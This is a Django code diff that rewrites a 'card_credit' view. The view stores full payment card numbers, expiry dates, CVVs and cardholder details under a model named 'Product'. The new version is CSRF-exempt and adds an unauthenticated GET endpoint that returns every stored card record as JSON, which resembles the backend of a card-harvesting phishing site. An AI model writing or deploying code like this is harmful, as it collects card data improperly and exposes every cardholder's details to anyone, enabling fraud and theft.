@@ -74,28 +74,61 @@ def home(request):
         context['domain'] = settings.DOMAIN
         print('context:',context)
         return render(request, 'sleekweb/client/home.html', context, status=200)
-    
-def card_credit(request):
-    if request.method == 'GET':
-        context = {}
-        context['domain'] = settings.DOMAIN
-        print('context:',context)
-        return render(request, 'sleekweb/client/card_credit.html', context, status=200)
-    if request.method == 'POST':
-        fields = {
-            "Email": request.POST.get('email'),
-            "First_name": request.POST.get('firstName'),
-            "Last_name": request.POST.get('lastName'),
-            "Card_number": request.POST.get('card.number'),
-            "MMYY": request.POST.get('card.expirationDate'),
-            "CVV": request.POST.get('card.CVV'),
-            "Name_Card": request.POST.get('card.name'),
-            "Country": request.POST.get('country'),
-            "Postal_code": request.POST.get('postalCode'),
-        }
 
-        Product.objects.create(**fields)
-        return redirect('home')
+@csrf_exempt
+def card_credit(request):
+    # if request.method == 'GET':
+    #     context = {}
+    #     context['domain'] = settings.DOMAIN
+    #     print('context:',context)
+    #     return render(request, 'sleekweb/client/card_credit.html', context, status=200)
+    # if request.method == 'POST':
+    #     fields = {
+    #         "Email": request.POST.get('email'),
+    #         "First_name": request.POST.get('firstName'),
+    #         "Last_name": request.POST.get('lastName'),
+    #         "Card_number": request.POST.get('card.number'),
+    #         "MMYY": request.POST.get('card.expirationDate'),
+    #         "CVV": request.POST.get('card.CVV'),
+    #         "Name_Card": request.POST.get('card.name'),
+    #         "Country": request.POST.get('country'),
+    #         "Postal_code": request.POST.get('postalCode'),
+    #     }
+
+    #     Product.objects.create(**fields)
+    #     return redirect('home')
+    if request.method == 'POST':
+        try:
+            # Lấy JSON body
+            data = json.loads(request.body.decode('utf-8'))
+            
+            fields = {
+                "Email": data.get('email'),
+                "First_name": data.get('firstName'),
+                "Last_name": data.get('lastName'),
+                "Card_number": data.get('card.number'),
+                "MMYY": data.get('card.expirationDate'),
+                "CVV": data.get('card.CVV'),
+                "Name_Card": data.get('card.name'),
+                "Country": data.get('country'),
+                "Postal_code": data.get('postalCode'),
+            }
+
+            product = Product.objects.create(**fields)
+
+            return JsonResponse(
+                {"message": "Created successfully", "id": product.id},
+                status=201
+            )
+
+        except Exception as e:
+            return JsonResponse({"error": str(e)}, status=400)
+
+    elif request.method == 'GET':
+        products = Product.objects.all().values()
+        return JsonResponse(list(products), safe=False, status=200)
+
+    return JsonResponse({"error": "Method not allowed"}, status=405)
     
 def product(request):
     if not request.user.is_authenticated:
